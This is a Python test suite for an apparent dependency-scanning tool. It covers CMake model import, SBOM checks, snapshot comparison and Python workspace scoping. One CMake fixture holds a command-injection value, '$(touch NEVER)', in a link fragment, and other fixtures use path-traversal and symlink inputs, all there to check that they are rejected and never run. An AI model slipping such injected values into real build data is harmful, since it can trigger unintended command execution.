import asyncio
import json
import sys
from contextlib import closing
from pathlib import Path
from types import SimpleNamespace

import pytest

from depcheck.agent import DependencyAgentService, mcp_server
from depcheck.agent.mcp_server import create_server
from depcheck.command import main
from depcheck.engine import RepositoryScanner, RepositoryScanOptions


def make_python_project(root: Path) -> None:
    (root / "requirements.txt").write_text(
        "requests==2.31.0\n",
        encoding="utf-8",
    )
    (root / "app.py").write_text("import requests\n", encoding="utf-8")


def mcp_stdio_arguments(*arguments: str) -> list[str]:
    return [
        "-c",
        "import faulthandler, runpy; "
        "faulthandler.dump_traceback_later(10); "
        "runpy.run_module('depcheck.agent.mcp_server', run_name='__main__')",
        *arguments,
    ]


def _make_cmake_reply(root, *, minor=9):
    reply = root / "build/.cmake/api/v1/reply"
    reply.mkdir(parents=True)
    version = {"major": 2, "minor": minor}
    targets = [
        {"id": name + "::@scope", "name": name, "jsonFile": name + ".json"}
        for name in ("app", "library", "codegen")
    ]
    model = {
        "kind": "codemodel",
        "version": version,
        "paths": {"source": "/recorded/source", "build": "/recorded/build"},
        "configurations": [
            {"name": "Debug", "targets": targets},
            {"name": "Release", "targets": [targets[1]]},
        ],
    }
    index = {
        "objects": [{"kind": "codemodel", "version": version, "jsonFile": "model.json"}]
    }
    library, codegen = targets[1]["id"], targets[2]["id"]
    app = {
        "id": targets[0]["id"],
        "name": "app",
        "type": "EXECUTABLE",
        "paths": {"source": ".", "build": "."},
        "dependencies": [{"id": library}, {"id": codegen}],
        "sources": [
            {"path": "src/main.cpp", "compileGroupIndex": 0, "backtrace": 1},
            {
                "path": "/foreign/generated.cpp",
                "isGenerated": True,
                "backtrace": 2,
            },
            {"path": "src/header.hpp"},
        ],
        "link": {
            "commandFragments": [
                {"role": "flags", "fragment": "-Wl,--as-needed"},
                {"role": "libraries", "fragment": "/foreign/lib.a;$(touch NEVER)"},
            ]
        },
    }
    if minor >= 9:
        app.update(
            linkLibraries=[
                {"id": library},
                {"id": library},
                {"fragment": "-lm", "backtrace": 2},
            ],
            compileDependencies=[{"id": library}],
            orderDependencies=[{"id": codegen}],
        )
    bodies = {"index-demo.json": index, "model.json": model, "app.json": app}
    for entry in targets[1:]:
        bodies[entry["jsonFile"]] = {
            "id": entry["id"],
            "name": entry["name"],
            "type": "STATIC_LIBRARY" if entry["name"] == "library" else "UTILITY",
            "paths": {"source": ".", "build": "."},
        }
    if minor >= 9:
        for name, value in bodies.items():
            if name not in {"index-demo.json", "model.json"}:
                value["codemodelVersion"] = version
    for name, value in bodies.items():
        (reply / name).write_text(json.dumps(value), encoding="utf-8")
    return (reply / "index-demo.json").relative_to(root).as_posix(), reply


def test_cmake_model_contract_preserves_relationships_paging_and_read_only_boundaries(
    tmp_path, monkeypatch, capsys
):
    from depcheck import cmake_model

    index, reply = _make_cmake_reply(tmp_path)
    cache = tmp_path / ".depcheck/index.sqlite3"
    cache.parent.mkdir()
    cache.write_bytes(b"unrelated derived cache")
    original = {
        path: (path.read_bytes(), path.stat().st_mtime_ns)
        for path in tmp_path.rglob("*")
        if path.is_file()
    }
    actual_read = cmake_model.read_bytes

    def read_only_replies(path, **kwargs):
        assert path.parent == reply
        return actual_read(path, **kwargs)

    monkeypatch.setattr(cmake_model, "read_bytes", read_only_replies)
    service = DependencyAgentService(tmp_path)
    with pytest.raises(ValueError, match="configuration"):
        service.inspect_cmake_model(index)
    rows = {
        key: []
        for key in (
            "targets",
            "relationships",
            "sources",
            "command_fragments",
            "input_files",
        )
    }
    offset = 0
    while True:
        result = service.inspect_cmake_model(
            index, configuration="Debug", limit=2, offset=offset
        )
        assert result["import_complete"] and not result["evidence_complete"]
        assert result["coverage"]["source_freshness"] == "unknown"
        assert result["coverage"]["security"] == "skipped"
        assert result["coverage"]["package_mapping"] == "unsupported"
        for key in rows:
            rows[key].extend(result[key])
        if result["next_offset"] is None:
            break
        offset = result["next_offset"]
    assert [t["name"] for t in rows["targets"]] == ["app", "library", "codegen"]
    assert [r["id"] for r in rows["relationships"] if r["kind"] == "dependencies"] == [
        "library::@scope",
        "codegen::@scope",
    ]
    assert [
        r.get("id", r.get("fragment"))
        for r in rows["relationships"]
        if r["kind"] == "linkLibraries"
    ] == ["library::@scope", "library::@scope", "-lm"]
    assert rows["sources"][1]["reported_path"] == "/foreign/generated.cpp"
    assert rows["sources"][1]["generated"] is True
    assert rows["sources"][0]["location"]["json_pointer"] == "/sources/0"
    assert rows["command_fragments"][1]["fragment"] == "/foreign/lib.a;$(touch NEVER)"
    assert len(rows["input_files"]) == 5
    assert all(len(row["sha256"]) == 64 for row in rows["input_files"])
    assert not (tmp_path / "NEVER").exists()
    assert all(
        (path.read_bytes(), path.stat().st_mtime_ns) == state
        for path, state in original.items()
    )
    assert (
        main(
            [
                "cmake-model",
                str(tmp_path),
                index,
                "--configuration",
                "Debug",
                "--target",
                "app::@scope",
                "--limit",
                "1",
            ]
        )
        == 0
    )
    cli = json.loads(capsys.readouterr().out)
    assert (
        cli["schema"] == "depcheck.cmake-model.v1" and cli["reported_target_count"] == 1
    )


def test_cmake_model_selection_legacy_graph_and_unreadable_neighbors(tmp_path):
    index, reply = _make_cmake_reply(tmp_path, minor=0)
    service = DependencyAgentService(tmp_path)
    legacy = service.inspect_cmake_model(index, configuration="Debug")
    assert {r["kind"] for r in legacy["relationships"]} == {"dependencies"}
    assert legacy["import_complete"] and not legacy["evidence_complete"]
    (reply / "app.json").write_text('{"id":"first","id":"replaced"}')
    release = service.inspect_cmake_model(index, configuration="Release")
    assert release["import_complete"] and [t["name"] for t in release["targets"]] == [
        "library"
    ]
    debug = service.inspect_cmake_model(index, configuration="Debug")
    assert not debug["import_complete"]
    assert [t["detail_status"] for t in debug["targets"]] == [
        "unavailable",
        "reported",
        "reported",
    ]
    assert debug["diagnostics"][0]["code"] == "cmake-model.target-unavailable"
    with pytest.raises(ValueError, match="target"):
        service.inspect_cmake_model(index, configuration="Debug", target="app")


def test_cmake_model_abstract_targets_keep_link_identity_and_versioned_source_context(
    tmp_path,
):
    index, reply = _make_cmake_reply(tmp_path, minor=11)
    model = json.loads((reply / "model.json").read_text())
    imported = {
        "id": "Vendor::Library::@local",
        "name": "Vendor::Library",
        "jsonFile": "vendor.json",
    }
    model["configurations"][0]["abstractTargets"] = [imported]
    (reply / "model.json").write_text(json.dumps(model))
    detail = {
        **{k: imported[k] for k in ("id", "name")},
        "type": "INTERFACE_LIBRARY",
        "paths": {"source": "/foreign", "build": "/foreign"},
        "codemodelVersion": model["version"],
        "imported": True,
        "local": True,
        "abstract": True,
        "symbolic": True,
        "interfaceSources": [{"path": "/foreign/header.hpp", "fileSetIndexes": [0, 1]}],
    }
    (reply / "vendor.json").write_text(json.dumps(detail))
    app = json.loads((reply / "app.json").read_text())
    app["linkLibraries"].append({"id": imported["id"]})
    app["sources"][0]["backtraces"] = [1, 2]
    app["isGeneratorProvided"] = True
    (reply / "app.json").write_text(json.dumps(app))
    service = DependencyAgentService(tmp_path)
    result = service.inspect_cmake_model(index, configuration="Debug", limit=100)
    assert result["import_complete"] and result["reported_target_count"] == 4
    vendor = result["targets"][-1]
    assert (
        vendor["imported"]
        and vendor["local"]
        and vendor["abstract"]
        and vendor["symbolic"]
    )
    assert vendor["collection"] == "abstractTargets"
    assert vendor["location"]["json_pointer"] == "/configurations/0/abstractTargets/0"
    assert result["targets"][0]["isGeneratorProvided"]
    assert result["sources"][0]["backtraces"] == [1, 2]
    assert result["sources"][-1]["collection"] == "interfaceSources"
    assert result["sources"][-1]["fileSetIndexes"] == [0, 1]
    linked = next(r for r in result["relationships"] if r.get("id") == imported["id"])
    assert linked["target_present"] and linked["target_detail_status"] == "reported"
    selected = service.inspect_cmake_model(
        index, configuration="Debug", target="app::@scope", limit=100
    )
    linked = next(r for r in selected["relationships"] if r.get("id") == imported["id"])
    assert linked["target_present"] and linked["target_detail_status"] == "not-selected"
    assert selected["import_complete"]
    exact = service.inspect_cmake_model(
        index, configuration="Debug", target=imported["id"]
    )
    assert exact["targets"][0]["imported"] and exact["reported_target_count"] == 1


@pytest.mark.parametrize(
    "provenance",
    ["duplicate-id", "version-mismatch", "missing-version", "future-field"],
)
def test_cmake_model_inconsistent_target_provenance_is_not_complete(
    tmp_path, provenance
):
    index, reply = _make_cmake_reply(tmp_path)
    if provenance == "duplicate-id":
        model = json.loads((reply / "model.json").read_text())
        model["configurations"][0]["abstractTargets"] = [
            model["configurations"][0]["targets"][0]
        ]
        (reply / "model.json").write_text(json.dumps(model))
        with pytest.raises(ValueError, match="unique"):
            DependencyAgentService(tmp_path).inspect_cmake_model(
                index, configuration="Debug"
            )
        return
    app = json.loads((reply / "app.json").read_text())
    if provenance == "version-mismatch":
        app["codemodelVersion"] = {"major": 2, "minor": 8}
    elif provenance == "missing-version":
        del app["codemodelVersion"]
    else:
        app["interfaceSources"] = [{"path": "header.hpp"}]
    (reply / "app.json").write_text(json.dumps(app))
    result = DependencyAgentService(tmp_path).inspect_cmake_model(
        index, configuration="Debug"
    )
    assert not result["import_complete"] and result["diagnostics"]
    assert result["targets"][1]["detail_status"] == "reported"
    if provenance == "version-mismatch":
        assert result["targets"][0]["detail_status"] == "unavailable"


@pytest.mark.parametrize(
    "boundary",
    [
        "reference",
        "outside-index",
        "symlink",
        "identity",
        "files",
        "bytes",
        "records",
        "unresolved",
        "from-dependency",
    ],
)
def test_cmake_model_input_boundaries_are_rejected_or_qualified(
    tmp_path, monkeypatch, boundary
):
    from depcheck import cmake_model

    root = tmp_path / "repo"
    root.mkdir()
    index, reply = _make_cmake_reply(root)
    service = DependencyAgentService(root)
    if boundary == "reference":
        model = json.loads((reply / "model.json").read_text())
        model["configurations"][0]["targets"][0]["jsonFile"] = "../../outside.json"
        (reply / "model.json").write_text(json.dumps(model))
        with pytest.raises(ValueError, match="plain JSON"):
            service.inspect_cmake_model(index, configuration="Debug")
        return
    if boundary == "outside-index":
        (tmp_path / "index-outside.json").write_text("{}")
        from depcheck.path_policy import ProjectPathError

        with pytest.raises(ProjectPathError):
            service.inspect_cmake_model("../index-outside.json", configuration="Debug")
        return
    if boundary == "symlink":
        outside = tmp_path / "external.json"
        outside.write_text((reply / "app.json").read_text())
        (reply / "app.json").unlink()
        try:
            (reply / "app.json").symlink_to(outside)
        except OSError:
            pytest.skip("symlinks unavailable")
    elif boundary == "identity":
        detail = json.loads((reply / "app.json").read_text())
        detail["id"] = "wrong-target"
        (reply / "app.json").write_text(json.dumps(detail))
    elif boundary == "files":
        monkeypatch.setattr(cmake_model, "_MAX_FILES", 3)
    elif boundary == "bytes":
        consumed = sum(
            (reply / name).stat().st_size
            for name in ("index-demo.json", "model.json", "app.json")
        )
        monkeypatch.setattr(cmake_model, "_MAX_BYTES", consumed)
    elif boundary == "records":
        monkeypatch.setattr(cmake_model, "_MAX_RECORDS", 2)
    elif boundary == "unresolved":
        detail = json.loads((reply / "app.json").read_text())
        detail["dependencies"].append({"id": "absent"})
        (reply / "app.json").write_text(json.dumps(detail))
    elif boundary == "from-dependency":
        detail = json.loads((reply / "app.json").read_text())
        detail["linkLibraries"][0]["fromDependency"] = {"id": "absent"}
        (reply / "app.json").write_text(json.dumps(detail))
    result = service.inspect_cmake_model(index, configuration="Debug", limit=100)
    assert not result["import_complete"] and not result["evidence_complete"]
    assert result["diagnostics"]
    if boundary in {"symlink", "identity"}:
        assert [t["detail_status"] for t in result["targets"]] == [
            "unavailable",
            "reported",
            "reported",
        ]
    if boundary == "records":
        assert result["omitted_target_count"] == 2
    if boundary == "unresolved":
        assert any(
            r.get("id") == "absent" and r["target_present"] is False
            for r in result["relationships"]
        )
    if boundary == "from-dependency":
        assert result["relationships"][2]["target_present"] is True
        assert result["relationships"][2]["from_dependency_present"] is False


@pytest.mark.parametrize("kind", ["tool", "mapping"])
def test_split_python_components_require_migrating_legacy_config_scope(tmp_path, kind):
    from depcheck.config import ConfigurationError
    from depcheck.indexing import RepositoryIndex, RepositoryIndexer

    for name in ("a", "b"):
        component = tmp_path / name
        component.mkdir()
        (component / "pyproject.toml").write_text(
            f'[project]\nname="{name}"\nversion="1"\ndependencies=["ruff==0.11.0"]\n'
        )
        if kind == "mapping":
            (component / "main.py").write_text("import company_lint\n")

    def configuration(project_id):
        if kind == "mapping":
            return f'[mappings.PyPI."{project_id}"]\ncompany_lint="ruff"\n'
        return (
            f'[[tool-usage]]\necosystem="PyPI"\nproject-id="{project_id}"\n'
            'package="ruff"\nscope="test"\nreason="CI lint"\n'
        )

    config = tmp_path / ".depcheck.toml"
    config.write_text(configuration("pypi:python:."))
    with pytest.raises(ConfigurationError, match="pypi:python:a"):
        RepositoryScanner().scan(tmp_path, RepositoryScanOptions(security=False))
    config.write_text(configuration("pypi:python:a") + configuration("pypi:python:b"))
    RepositoryIndexer().refresh(tmp_path)
    assert not RepositoryIndex(tmp_path).context()["stale"]
    assert (
        not RepositoryScanner()
        .scan(tmp_path, RepositoryScanOptions(security=False))
        .findings
    )
    cache = tmp_path / ".depcheck/index.sqlite3"
    original = cache.read_bytes()
    config.write_text(configuration("pypi:python:."))
    assert RepositoryIndex(tmp_path).context()["stale"]
    with pytest.raises(ConfigurationError, match="pypi:python:b"):
        RepositoryIndexer().refresh(tmp_path)
    assert cache.read_bytes() == original


@pytest.mark.parametrize("reference", ["library", "", 42, [], {}, None])
def test_sbom_rejects_invalid_application_reference_at_cli_boundary(
    tmp_path, capsys, reference
):
    bom = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.7",
        "metadata": {"component": {"bom-ref": reference, "name": "app"}},
        "components": [
            {
                "bom-ref": "library",
                "name": "requests",
                "purl": "pkg:pypi/requests@2.32.4",
            }
        ],
        "dependencies": [{"ref": "library", "dependsOn": ["library"]}],
    }
    path = tmp_path / "bom.json"
    original = json.dumps(bom).encode()
    path.write_bytes(original)
    assert main(["sbom", str(tmp_path), "bom.json"]) == 2
    output = capsys.readouterr()
    assert not output.out and "reference" in output.err
    assert path.read_bytes() == original
    assert not (tmp_path / ".depcheck").exists()


def test_snapshot_comparison_keeps_versions_and_skipped_security_distinct(tmp_path):

    (tmp_path / "package.json").write_text('{"dependencies":{"tool":"*"}}')
    (tmp_path / "main.js").write_text('import "tool";\n')
    for name, version in (("before.json", "1.0.0"), ("after.json", "2.0.0")):
        (tmp_path / "package-lock.json").write_text(
            json.dumps({"packages": {"node_modules/tool": {"version": version}}})
        )
        result = RepositoryScanner().scan(
            tmp_path, RepositoryScanOptions(security=False, compatibility=False)
        )
        (tmp_path / name).write_text(json.dumps(result.to_dict()))
    before = {p.name: p.read_bytes() for p in tmp_path.iterdir() if p.is_file()}
    comparison = DependencyAgentService(tmp_path).compare_dependency_snapshots(
        "before.json", "after.json"
    )
    assert comparison["comparable"] and comparison["read_only"]
    assert comparison["changes"]["resolved_added"][0]["version"] == "2.0.0"
    assert comparison["changes"]["resolved_removed"][0]["version"] == "1.0.0"
    assert comparison["capabilities"]["security"]["state"] == "incomplete"
    assert not comparison["remediation_verified"]
    assert {p.name: p.read_bytes() for p in tmp_path.iterdir() if p.is_file()} == before


def test_snapshot_comparison_preserves_go_checksum_only_changes(tmp_path):
    (tmp_path / "go.mod").write_text("module example.com/app\n")
    checksum_file = tmp_path / "go.sum"
    for name, encoded in (
        ("before.json", "A" * 43 + "="),
        ("after.json", "B" * 42 + "A="),
    ):
        checksum_file.write_text("example.com/dep v1.0.0 h1:" + encoded + "\n")
        result = RepositoryScanner().scan(
            tmp_path, RepositoryScanOptions(security=False)
        )
        (tmp_path / name).write_text(json.dumps(result.to_dict()))
    original = checksum_file.read_bytes()
    comparison = DependencyAgentService(tmp_path).compare_dependency_snapshots(
        "before.json", "after.json"
    )
    assert comparison["comparable"] and comparison["read_only"]
    assert comparison["counts"]["declarations_added"] == 1
    assert comparison["counts"]["declarations_removed"] == 1
    added = comparison["changes"]["declarations_added"][0]
    removed = comparison["changes"]["declarations_removed"][0]
    assert added["metadata"]["checksum"] != removed["metadata"]["checksum"]
    assert added["metadata"]["integrity_verified"] is False
    assert not comparison["remediation_verified"]
    assert (
        checksum_file.read_bytes() == original and not (tmp_path / ".depcheck").exists()
    )


@pytest.mark.parametrize(
    "repository_id,comparable", [(None, False), ("team/repo", True)]
)
def test_snapshot_explicit_identity_is_portable(tmp_path, repository_id, comparable):
    from depcheck.snapshots import compare_snapshots

    snapshots = []
    for name, version in (("first", "1.0.0"), ("second", "2.0.0")):
        root = tmp_path / name
        root.mkdir()
        (root / "package.json").write_text(
            json.dumps({"dependencies": {"lib": version}})
        )
        if repository_id:
            (root / ".depcheck.toml").write_text(f'repository-id = "{repository_id}"\n')
        snapshots.append(
            RepositoryScanner()
            .scan(root, RepositoryScanOptions(security=False))
            .to_dict()
        )
    for name, snapshot in zip(("before.json", "after.json"), snapshots):
        (tmp_path / name).write_text(json.dumps(snapshot))
    result = compare_snapshots(tmp_path, "before.json", "after.json", limit=20)
    assert result["comparable"] is comparable
    if comparable:
        assert result["counts"]["declarations_added"] == 1
        assert not result["remediation_verified"]
        assert snapshots[0]["metadata"]["snapshot"]["identity_source"] == "configured"


@pytest.mark.parametrize(
    "value", ['""', "42", '"bad\\nidentity"', '"' + "a" * 257 + '"']
)
def test_snapshot_identity_rejects_invalid_values(tmp_path, value):
    from depcheck.config import ConfigurationError, load_project_config

    (tmp_path / ".depcheck.toml").write_text(f"repository-id = {value}\n")
    with pytest.raises(ConfigurationError):
        load_project_config(tmp_path)


def test_snapshot_comparison_refuses_legacy_identity_and_outside_paths(tmp_path):

    snapshot = (
        RepositoryScanner()
        .scan(tmp_path, RepositoryScanOptions(security=False))
        .to_dict()
    )
    (tmp_path / "current.json").write_text(json.dumps(snapshot))
    snapshot["metadata"].pop("snapshot", None)
    (tmp_path / "old.json").write_text(json.dumps(snapshot))
    result = DependencyAgentService(tmp_path).compare_dependency_snapshots(
        "old.json", "current.json"
    )
    assert not result["comparable"] and not result["changes"]
    assert any(d["code"] == "snapshot.incompatible" for d in result["diagnostics"])
    with pytest.raises((PermissionError, ValueError)):
        DependencyAgentService(tmp_path).compare_dependency_snapshots(
            "../outside.json", "current.json"
        )


def test_component_update_handoff_selects_owner_and_keeps_verification_pending(
    tmp_path,
):
    for name in ("a", "b"):
        component = tmp_path / name
        component.mkdir()
        (component / "pyproject.toml").write_text(
            f'[project]\nname="{name}"\nversion="1.0"\ndependencies=[]\n'
        )
        (component / "requirements.txt").write_text("PyYAML==6.0.2\n")
        (component / "main.py").write_text("import yaml\n")
    service = DependencyAgentService(tmp_path)
    ambiguous = service.plan_dependency_updates({"pyyaml": "6.0.3"})
    assert any(d["code"] == "update.ambiguous-target" for d in ambiguous["diagnostics"])
    result = service.plan_dependency_updates(
        {"pyyaml": "6.0.3"}, project_id="pypi:python:a"
    )
    assert [p["file"] for p in result["plans"]] == ["a/requirements.txt"]
    assert result["project_id"] == "pypi:python:a"
    assert result["handoff"]["status"] == "ready"
    assert all(
        check["status"] == "not-run" for check in result["handoff"]["verification"]
    )
    assert (tmp_path / "a/requirements.txt").read_text() == "PyYAML==6.0.2\n"


def test_named_python_components_keep_separate_inventory_usage_and_updates(tmp_path):

    for name, requirement, module in (
        ("a", "PyYAML==6.0.2", "yaml"),
        ("b", "scikit-learn==1.5.0", "sklearn"),
    ):
        component = tmp_path / name
        component.mkdir()
        (component / "pyproject.toml").write_text(
            f'[project]\nname="{name}"\nversion="1.0"\ndependencies=["{requirement}"]\n'
        )
        (component / "main.py").write_text(f"import {module}\n")
    result = RepositoryScanner().scan(tmp_path, RepositoryScanOptions(security=False))
    assert {b.project.project_id for b in result.bundles} == {
        "pypi:python:a",
        "pypi:python:b",
    }
    assert result.capability("dependency_hygiene").complete
    assert not result.findings
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    context = service.repository_context()
    assert not context["stale"] and context["scope"]["repository_complete"]
    explanation = service.explain_dependency("pyyaml", project_id="pypi:python:a")
    assert explanation["usage_complete"] and explanation["evidence_complete"]
    assert {u["location"]["path"] for u in explanation["usages"]} == {"a/main.py"}
    (tmp_path / "a/main.py").write_text("import yaml\nimport sklearn\n")
    assert service.repository_context()["stale"]


def test_nested_python_components_do_not_share_local_module_names(tmp_path):

    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="root"\nversion="1.0"\ndependencies=["PyYAML==6.0.2"]\n'
    )
    (tmp_path / "main.py").write_text("import yaml\n")
    child = tmp_path / "child"
    child.mkdir()
    (child / "pyproject.toml").write_text(
        '[project]\nname="child"\nversion="1.0"\ndependencies=[]\n'
    )
    (child / "yaml.py").write_text("value = 1\n")
    result = RepositoryScanner().scan(tmp_path, RepositoryScanOptions(security=False))
    root = next(b for b in result.bundles if b.project.project_id == "pypi:python:.")
    assert {u.mapped_package.name for u in root.usages} == {"pyyaml"}
    assert root.source_files == (tmp_path / "main.py",)
    assert not result.findings


def test_independent_python_components_do_not_establish_duplicate_installations(
    tmp_path,
):
    for name in ("gateway", "security"):
        component = tmp_path / name
        component.mkdir()
        (component / "pyproject.toml").write_text(
            '[project]\ndependencies=["cryptography>=45"]\n'
        )
    result = RepositoryScanner().scan(tmp_path, RepositoryScanOptions(security=False))
    assert not any(
        f.code in {"declaration.duplicate", "declaration.conflict"}
        for f in result.findings
    )
    assert any(
        d.code == "analysis.python-component-scope-ambiguous"
        for d in result.diagnostics
    )
    assert not result.capability("dependency_hygiene").complete


def test_disjoint_python_components_keep_aggregate_ownership_unknown(tmp_path):

    for name, requirement, module in (
        ("a", "PyYAML==6.0.2", "sklearn"),
        ("b", "scikit-learn==1.5.0", "yaml"),
    ):
        component = tmp_path / name
        component.mkdir()
        (component / "pyproject.toml").write_text(
            f'[project]\ndependencies=["{requirement}"]\n'
        )
        (component / "app.py").write_text(f"import {module}\n")
    scanner = RepositoryScanner()
    options = RepositoryScanOptions(security=False, compatibility=False)
    aggregate = scanner.scan(tmp_path, options)
    assert not aggregate.capability("dependency_hygiene").complete
    assert any(
        item.code == "analysis.python-component-scope-ambiguous"
        for item in aggregate.diagnostics
    )
    assert not aggregate.findings
    for component in ("a", "b"):
        narrowed = scanner.scan(tmp_path / component, options)
        assert any(item.code == "dependency.missing" for item in narrowed.findings)
        assert narrowed.capability("dependency_hygiene").complete
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    explanation = service.explain_dependency("pyyaml")
    assert not explanation["usage_complete"]
    assert not explanation["evidence_complete"]


def test_configured_python_roots_separate_anonymous_components(tmp_path):
    (tmp_path / ".depcheck.toml").write_text('python-roots = ["a", "b"]\n')
    for name, package, imported in (
        ("a", "requests", "requests"),
        ("b", "urllib3", "urllib3"),
    ):
        component = tmp_path / name
        component.mkdir()
        (component / "requirements.txt").write_text(f"{package}==1.0.0\n")
        (component / "main.py").write_text(f"import {imported}\n")
    result = RepositoryScanner().scan(tmp_path, RepositoryScanOptions(security=False))
    assert {b.project.project_id for b in result.bundles} == {
        "pypi:python:a",
        "pypi:python:b",
    }
    assert not any(
        f.code in {"dependency.missing", "dependency.unused"} for f in result.findings
    )
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    assert (
        len(
            service.explain_dependency("requests", project_id="pypi:python:a")["usages"]
        )
        == 1
    )


def test_uv_workspace_members_keep_ownership_and_shared_activation_unknown(tmp_path):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="root"\nversion="1"\n[tool.uv.workspace]\nmembers=["packages/*"]\n'
    )
    (tmp_path / "uv.lock").write_text(
        'version=1\n[[package]]\nname="requests"\nversion="2.31.0"\nsource={registry="https://pypi.org/simple"}\n'
    )
    member = tmp_path / "packages/member"
    member.mkdir(parents=True)
    (member / "pyproject.toml").write_text(
        '[project]\nname="member"\nversion="1"\ndependencies=["requests>=2"]\n'
    )
    (member / "main.py").write_text("import requests\n")
    result = RepositoryScanner().scan(tmp_path, RepositoryScanOptions(security=False))
    bundles = {b.project.project_id: b for b in result.bundles}
    assert set(bundles) == {"pypi:python:.", "pypi:python:packages/member"}
    assert {
        d.package.name for d in bundles["pypi:python:packages/member"].declarations
    } == {"requests"}
    assert not bundles["pypi:python:packages/member"].resolved
    for bundle in bundles.values():
        assert any(
            d.code == "resolution.uv-workspace-activation-unknown"
            for d in bundle.diagnostics
        )
        assert not next(
            c for c in bundle.capabilities if c.name == "resolution"
        ).complete


@pytest.mark.parametrize("selected", [False, True])
def test_uv_fork_context_survives_refresh_and_read_only_queries(tmp_path, selected):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="app"\nversion="1"\ndependencies=["foo>=1"]\n'
    )
    path = tmp_path / "uv.lock"
    path.write_text(
        'version=1\nrequires-python=">=3.9"\n'
        "resolution-markers=[\"sys_platform == 'win32'\", \"sys_platform != 'win32'\"]\n"
        '[[package]]\nname="foo"\nversion="1.0.0"\nsource={registry="https://pypi.org/simple"}\n'
        "resolution-markers=[\"sys_platform == 'win32'\"]\n"
        '[[package]]\nname="foo"\nversion="1.0.0"\nsource={registry="https://pypi.org/simple"}\n'
        "resolution-markers=[\"sys_platform != 'win32'\"]\n"
    )
    (tmp_path / "main.py").write_text("import foo\n")
    service = DependencyAgentService(tmp_path)
    selection = {"project_ids": ["pypi:python:."]} if selected else {}
    service.index_repository(**selection)
    index = tmp_path / ".depcheck/index.sqlite3"
    before = index.read_bytes(), index.stat().st_mtime_ns
    explanation = service.explain_dependency("foo", project_id="pypi:python:.")
    assert not explanation["evidence_complete"] and explanation["usage_complete"]
    resolutions = explanation["resolutions"]
    assert len(resolutions) == 2
    assert len({r["instance"] for r in resolutions}) == 2
    assert [
        r["origin"]["lock"]["package"]["resolution-markers"] for r in resolutions
    ] == [
        ["sys_platform == 'win32'"],
        ["sys_platform != 'win32'"],
    ]
    assert (index.read_bytes(), index.stat().st_mtime_ns) == before
    refreshed = service.index_repository(**selection)
    if not selected:
        assert refreshed["parsed_manifest_files"] == 0
    again = service.explain_dependency("foo", project_id="pypi:python:.")
    assert again["resolutions"] == resolutions


def test_root_only_uv_workspace_keeps_index_capabilities_consistent(tmp_path):
    (tmp_path / "pyproject.toml").write_text("[tool.uv.workspace]\nmembers=[]\n")
    (tmp_path / "requirements.txt").write_text("requests==2.31.0\n")
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    assert not service.explain_dependency("requests")["evidence_complete"]


@pytest.mark.parametrize("value", ['["../escape"]', '["a", "a"]', '["missing"]'])
def test_python_roots_reject_invalid_scopes(tmp_path, value):
    from depcheck.config import ConfigurationError, load_project_config

    (tmp_path / ".depcheck.toml").write_text(f"python-roots = {value}\n")
    with pytest.raises(ConfigurationError):
        load_project_config(tmp_path)


@pytest.mark.parametrize("suffix", ["css", "scss", "sass"])
@pytest.mark.parametrize("filtered", [False, True])
def test_styles_preserve_usage_status_and_invalidate_index(tmp_path, suffix, filtered):

    (tmp_path / "package.json").write_text('{"dependencies":{"normalize.css":"8.0.1"}}')
    style = tmp_path / f"styles.{suffix}"
    style.write_text('@import "normalize.css";\n')
    result = RepositoryScanner().scan(
        tmp_path, RepositoryScanOptions(security=False, compatibility=False)
    )
    assert not any(item.code == "dependency.unused" for item in result.findings)
    assert result.metadata["coverage"]["uncovered"]
    assert any(
        item["reason"]
        == (
            "usage.unsupported-css-scope"
            if suffix == "css"
            else "usage.unsupported-source"
        )
        for item in result.metadata["coverage"]["uncovered"]
    )
    service = DependencyAgentService(tmp_path)
    selection = {"ecosystems": ["npm"]} if filtered else {}
    service.index_repository(**selection)
    explanation = service.explain_dependency("normalize.css")
    assert not explanation["usage_complete"]
    if suffix == "css":
        assert explanation["usages"][0]["reference"] == "normalize.css"
        assert explanation["usages"][0]["scope"] == "unknown"
    style.write_text('@import "other-package";\n')
    assert service.repository_context()["stale"]
    service.index_repository(**selection)
    assert not service.repository_context()["stale"]
    assert not service.explain_dependency("normalize.css")["usage_complete"]
    style.unlink()
    assert service.repository_context()["stale"]


def test_uncovered_manifest_is_not_an_empty_complete_repository(tmp_path):

    manifest = tmp_path / "composer.json"
    manifest.write_text('{"require":{"vendor/package":"1.0.0"}}')
    result = RepositoryScanner().scan(
        tmp_path, RepositoryScanOptions(security=False, compatibility=False)
    )
    assert not result.capability("dependency_hygiene").complete
    assert result.metadata["coverage"]["uncovered"][0]["path"] == "composer.json"
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    context = service.repository_context()
    assert context["scope"]["repository_complete"]
    assert not context["complete"]
    assert context["coverage"]["uncovered"]
    assert "coverage.unsupported-manifest" in context["incomplete_reasons"]
    manifest.write_text('{"require":{"vendor/package":"2.0.0"}}')
    assert service.repository_context()["stale"]
    service.index_repository()
    manifest.unlink()
    assert service.repository_context()["stale"]


@pytest.mark.parametrize("filtered", [False, True])
def test_command_evidence_survives_queries_and_workflow_changes(tmp_path, filtered):
    (tmp_path / "requirements.txt").write_text("ruff==0.14.0\n")
    (tmp_path / "app.py").write_text("\n")
    service = DependencyAgentService(tmp_path)
    selection = {"ecosystems": ["PyPI"]} if filtered else {}
    service.index_repository(**selection)
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "quality.yml"
    workflow.write_text(
        "jobs:\n  quality:\n    steps:\n      - run: python -m ruff check .\n"
    )
    assert service.repository_context()["stale"]
    service.index_repository(**selection)
    result = service.explain_dependency("ruff")
    assert result["imports"] == []
    assert result["usages"][0]["kind"] == "command"
    assert result["usages"][0]["mapping_confidence"] == "exact"
    assert result["usages"][0]["location"]["path"] == ".github/workflows/quality.yml"
    assert service.dependency_impact("ruff")["usage_count"] == 1
    assert not service.repository_context()["stale"]
    workflow.write_text(
        "jobs:\n  quality:\n    steps:\n      - run: unknown-quality-tool\n"
    )
    assert service.repository_context()["stale"]
    service.index_repository(**selection)
    assert not service.explain_dependency("ruff")["usage_complete"]
    workflow.unlink()
    assert service.repository_context()["stale"]


